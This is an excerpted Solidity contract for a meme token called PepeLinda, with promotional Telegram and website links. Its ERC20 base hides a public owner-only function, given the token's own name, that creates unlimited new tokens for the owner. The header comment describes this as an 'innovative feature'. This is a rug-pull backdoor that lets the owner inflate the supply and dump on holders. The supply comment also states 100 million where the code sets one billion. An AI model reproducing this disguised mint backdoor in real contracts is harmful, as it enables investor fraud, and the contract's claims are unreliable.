...
//
// $PepeLinda proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/+8ZhE2sStRak1MWJl
//  📱Website ::https://PepeLinda.net/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepeLinda(uint256 amount) public onlyOwner {
 _PepeLinda(msg.sender, amount);
    }
    ...
    function _PepeLinda(address account, uint256 amount) internal virtual {
...
contract PepeLinda is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepe Linda", "PepeLinda") {
     _PepeLinda(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}